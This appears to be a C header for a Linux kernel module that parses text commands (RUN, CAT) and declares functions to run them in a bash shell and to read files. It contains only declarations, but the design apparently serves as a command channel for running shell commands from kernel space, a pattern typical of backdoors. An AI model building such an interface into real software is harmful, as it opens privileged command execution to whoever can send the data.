#ifndef COMMANDS_HEADER
#define COMMANDS_HEADER


#include <linux/module.h>
#include <linux/fs.h>

#include "debug.h"


// number of valid commands
#define COMMAND_NUM 2


// actions whic user can perform
typedef enum {
  RUN, 
  CAT,
  BAD_COMMAND
} command_t;


// parses the command, deletes the command string from data and returns the respective command
command_t parse_command(char* data);

// runs the command in bash shell
void run_shell_command(char* bash_command);

#define CAT_BUFFER_SIZE 100

// reads 'to_read' bytes from file into the buffer
int read_file(char* filename, char* buffer, int to_read, loff_t start);



#endif